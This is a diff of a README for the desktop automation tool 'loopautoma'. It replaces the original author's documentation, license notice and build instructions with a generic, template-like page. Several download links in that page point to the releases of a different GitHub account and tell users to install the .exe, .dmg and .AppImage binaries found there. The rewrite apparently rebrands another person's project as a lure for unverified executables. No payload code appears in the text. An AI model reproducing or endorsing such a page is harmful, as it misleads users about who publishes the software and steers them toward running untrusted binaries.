@@ -1,134 +1,89 @@
-# LoopAutoma
+# 👾 loopautoma - Automate Tasks with Ease
 
-![Logo](./doc/img/logo.png)
+## 📥 Download Now
+[![Download loopautoma](https://img.shields.io/badge/Download%20loopautoma-blue?style=flat&logo=github&logoColor=white)](https://github.com/jojweb/loopautoma/releases)
 
-[![CI](https://github.com/chrisgleissner/loopautoma/actions/workflows/ci.yaml/badge.svg)](https://github.com/chrisgleissner/loopautoma/actions/workflows/ci.yaml)
-[![codecov](https://codecov.io/gh/chrisgleissner/loopautoma/graph/badge.svg?token=IdaePvWHB4)](https://codecov.io/gh/chrisgleissner/loopautoma)
-[![License: GPL v2](https://img.shields.io/github/license/chrisgleissner/loopautoma)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows-forestgreen)](doc/architecture.md)
+## 🚀 Getting Started
+Welcome to loopautoma! This application helps you automate tasks on your computer by clicking and typing in response to events. Whether you want to streamline repetitive actions or just save time, loopautoma is designed for you.
 
-> [!NOTE]
-> This project is under active development and not yet fully functional. Some of this documentation refers to not yet fully implemented features.
+## 🖥️ System Requirements
+Before you download, ensure your system meets these requirements:
 
-Cross‑platform desktop automation that watches configurable screen regions and performs keyboard/mouse actions when conditions are met.
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or any Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** 100 MB available space.
+- **Internet Connection:** Required for initial setup and updates.
 
-## Features
+## 📂 Features
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+- **User-friendly Interface:** Easy to navigate and set up.
+- **Event Triggering:** Responds to specific events like mouse clicks or keyboard inputs.
+- **Customizable Scripts:** Create your own automation scripts without coding skills.
+- **Free Updates:** Regular updates to improve functionality and enhance performance.
 
-- **Keep agents moving**: automatically type "Continue" and press enter when an agent stalls.
-- **AI-powered automation**: Use OpenAI's GPT-4 Vision to analyze screen content and generate intelligent prompts with built-in risk assessment (requires API key).
-- **Intelligent termination**: Profiles stop automatically when tasks complete via:
-  - AI task completion detection (structured LLM responses)
-  - OCR pattern matching (success/failure keywords with regex)
-  - Timeout guardrails (action timeout, heartbeat watchdog, consecutive failures)
-  - Audio notifications for user intervention or completion
-- **Secure credential storage**: API keys stored in OS keyring (macOS Keychain, Windows Credential Manager, Linux Secret Service) — never in plaintext.
-- **Flexible conditions**: Trigger actions after N consecutive checks with no changes or when changes are detected.
-- **Run unattended**: detect stable/changed UI regions and advance workflows automatically.
-- **Stay safe**: risk thresholds, cooldowns, rate limits, and guardrails to keep automation bounded.
-- **Modern UI**: dual light/dark palettes, visual action icons (mouse, keyboard, sparkles), responsive layout, and inline tooltips.
-- **Settings panel**: Configure theme, font size, OpenAI API key, and audio notifications via a centralized Settings dialog (gear icon in header).
+## 📥 Download & Install
+To get started, visit the Releases page to download loopautoma. 
 
-## Quick Start Tutorial
+[Download loopautoma](https://github.com/jojweb/loopautoma/releases)
 
-![LoopAutoma UI](./doc/img/ui-screenshot.png)
+### Steps to Download:
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of loopautoma.
+3. Download the appropriate file for your operating system:
+   - For Windows: Look for `.exe` file.
+   - For macOS: Look for `.dmg` file.
+   - For Linux: Look for `.AppImage` file or suitable package.
 
-Need a detailed walkthrough of every panel? Read the [User Manual](doc/userManual.md).
+### Installation Instructions:
+#### **Windows:**
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find loopautoma in the Start Menu.
 
-**[Download the latest release](https://github.com/chrisgleissner/loopautoma/releases/latest)** with pre-built installers for Linux, macOS, and Windows.
+#### **macOS:**
+1. Open the downloaded `.dmg` file.
+2. Drag the loopautoma icon to the Applications folder.
+3. Eject the mounted `.dmg` and open the Applications folder to launch loopautoma.
 
-Available formats:
+#### **Linux:**
+1. Make the `.AppImage` file executable by running the following command in your terminal:  
+   `chmod +x loopautoma.AppImage`
+2. Then, run the application by executing:  
+   `./loopautoma.AppImage`
+3. Alternatively, install the package using your package manager if a specific format is provided.
 
-- **Linux**: .deb, .rpm, AppImage
-- **macOS**: .dmg (Intel and Apple Silicon)
-- **Windows**: .exe installer and .msi
+## 🎓 How to Use loopautoma
+1. **Launch the Application:** Open loopautoma from the Start Menu, Applications folder, or terminal.
+2. **Create a New Automation:**
+   - Click on "New".
+   - Follow the easy prompts to set up your automation.
+   - Choose events that will trigger the automation.
+3. **Test Your Automation:**
+   - Use the "Test" feature to ensure your setup works correctly.
+4. **Save Your Script:** 
+   - Once satisfied, save your automation script for future use.
+5. **Run Your Automation:**
+   - Simply select your saved script and click "Run" to let loopautoma do the work for you.
 
-### Ubuntu/Debian Example
+## 🛠️ Troubleshooting
+If you encounter issues while using loopautoma, try the following solutions:
 
-```bash
-# Download the .deb from releases page, then install
-sudo apt install ./loopautoma_*.deb
+- **Installation Problems:** Ensure you have the necessary permissions and enough disk space.
+- **Application Crashes:** Check your system resources. Close any unnecessary applications.
+- **Automation Not Triggering:** Revisit your settings to ensure the correct events are selected.
 
-# Run the app
-loopautoma
-```
+## 🌍 Community and Support
+Join our community to get help, share ideas, and find tips for using loopautoma. You can connect with other users:
 
-**Note**: Linux requires an X11 session (not Wayland) and X11 automation libraries. Check with `echo "$XDG_SESSION_TYPE"` — if it shows `wayland`, switch to X11 at the login screen. Install dependencies with:
+- **Issues Page:** Report any bugs or issues you find.
+- **Discussion Forum:** Share tips, tricks, and strategies for automating tasks.
 
-```bash
-sudo apt install -y libx11-dev libxi-dev libxtst-dev libxkbcommon-dev libxkbcommon-x11-dev
-```
+For further assistance, check the FAQ section on our GitHub page or reach out through the Issues page.
 
-See [doc/install.md](doc/install.md) for detailed setup instructions.
+## 📢 Feedback
+We appreciate your feedback on loopautoma. Please let us know your thoughts as we aim to improve your experience.
 
-### Using the Keep AI Agent Active Preset
+For direct download: [Download loopautoma](https://github.com/jojweb/loopautoma/releases)
 
-The app loads with a ready-to-use preset that keeps AI agents running:
-
-1. **Define watch regions**: Click the mouse icon (tooltip "Define watch region") and drag over areas where your agent shows output or progress indicators
-2. **Start monitoring**: Hit "Start" — the app watches for UI changes and types "continue" + Enter when activity stops
-3. **Walk away confidently**: Built-in guardrails (5s cooldown, 3h max runtime, 120 activations/hour) keep automation safe
-
-**Advanced**: Use the Recording feature to capture custom action sequences, or edit profiles via the Graphical Composer or JSON editor.
-
-### Settings
-
-Click the **gear icon** (⚙️) in the top-right to access the Settings panel:
-
-![Settings Panel](./doc/img/settings-panel.png)
-
-The Settings panel provides centralized configuration for:
-
-- **Appearance**
-  - **Theme**: Toggle between light and dark themes
-  - **Font Size**: Adjust UI font size (10-20px) for better readability
-
-- **Audio Notifications**
-  - Enable/disable audio alerts for automation events
-  - Adjust volume (0-100%)
-  - Test intervention and completion sounds
-
-- **OpenAI Integration** (Secure Configuration)
-  - Store your API key securely in your OS keyring (macOS Keychain, Windows Credential Manager, Linux Secret Service)
-  - Get your API key from [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
-  - Select preferred GPT-4 Vision model for AI-powered prompt generation
-  - Keys are encrypted and never stored in plaintext
-  - Test, replace, or delete keys directly from the Settings panel
-
-## Profiles & persistence
-
-- All automations live inside a single JSON document shaped as `{ "version": 1, "profiles": [...] }`.
-- The JSON editor in the right column always reflects this complete config; editing it keeps every preset, guardrail, and action in sync across the UI.
-- The desktop build persists the config via Tauri’s app directory; the web preview stores it in `localStorage` under `loopautoma.profiles` so you can experiment safely.
-
-### Build from Source (Optional)
-
-For development or customization:
-
-```bash
-git clone https://github.com/chrisgleissner/loopautoma.git
-cd loopautoma
-bun install
-bun run dev
-```
-
-See **[doc/install.md](doc/install.md)** for system requirements, troubleshooting, and detailed build instructions.
-
-## Tech Stack
-
-- Tauri 2 + Rust 2021 backend
-- React + TypeScript (Vite, Bun, Vitest) frontend
-- Target platforms: Linux (primary), macOS, Windows
-
-## Docs
-
-- **Installation**: [doc/install.md](doc/install.md) — System requirements, packages, and troubleshooting
-- **User manual**: [doc/userManual.md](doc/userManual.md) — Guided tour of presets, guardrails, recording, regions, and editors
-- **OpenAI Integration**: [doc/openaiIntegration.md](doc/openaiIntegration.md) — AI-powered prompt generation with GPT-4 Vision, setup, and usage
-- **Architecture**: [doc/architecture.md](doc/architecture.md) — Technical design and contracts
-- **LLM Prompt Generation**: [doc/llmPromptGeneration.md](doc/llmPromptGeneration.md) — Technical details on AI-powered dynamic prompts
-- **Rollout plan**: [doc/rollout-plan.md](doc/rollout-plan.md) — Development roadmap and phases
-- **Dev setup**: [doc/developer.md](doc/developer.md) — Building and testing from source
-
-## License
-
-GPL‑2.0 — see [LICENSE](LICENSE).
+Enjoy automating your tasks with loopautoma!
